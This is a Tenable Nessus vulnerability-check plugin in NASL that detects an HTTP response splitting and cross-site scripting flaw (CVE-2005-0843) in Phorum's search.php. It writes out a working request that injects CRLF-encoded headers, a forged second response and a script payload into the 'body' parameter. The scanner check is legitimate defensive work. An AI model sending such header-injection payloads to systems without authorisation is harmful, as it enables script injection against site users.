#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(17596);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-0843");
  script_bugtraq_id(12869);
  script_osvdb_id(14956);

  script_name(english:"Phorum search.php location Parameter HTTP Response Splitting");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The version of Phorum installed on the remote host does not properly
sanitize input used in the Location response header.  An attacker can
exploit this flaw with a specially crafted request to inject malicious
code into HTTP headers, which may allow execution of arbitrary HTML
and script code in a user's browser within the context of the remote
host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/393953" );
 script_set_attribute(attribute:"see_also", value:"http://www.phorum.org/story.php?48" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Phorum 5.0.15 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/03/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/22");
 script_cvs_date("$Date: 2015/02/11 21:07:50 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:phorum:phorum");
 script_end_attributes();


  script_summary(english:"Checks for HTTP response splitting vulnerability in Phorum");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencies("phorum_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phorum"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # A vulnerable system will output a redirect along with the
  # "response" in its body.
  xss = "<html><script>alert('Nessus was here');</script></html>";
  # nb: the url-encoded version is what we need to pass in.
  exss = "%3Chtml%3E%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E%3C%2Fhtml%3E";
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/search.php?",
      "forum_id=0&",
      "search=1&",
      "match_forum=ALL&",
      "body=%0d%0a",
        "Content-Length:%200%0d%0a%0d%0a",
        "HTTP/1.0%20200%20OK%0d%0a",
        "Content-Type:%20text/html%0d%0a",
        "Content-Length:%20", strlen(xss), "%0d%0a",
        "%0d%0a",
        exss, "%0d%0a",
        "&",
      "match_type=ALL&",
      "author=1&",
      "match_dates=30",
      "subject=1&"
    ),
    port:port
  );

  if (isnull(r)) exit(0);
  # If we get back our text, there's a problem.
  if (xss >< r[1] )
  {
   security_warning(port);
   set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  }
}
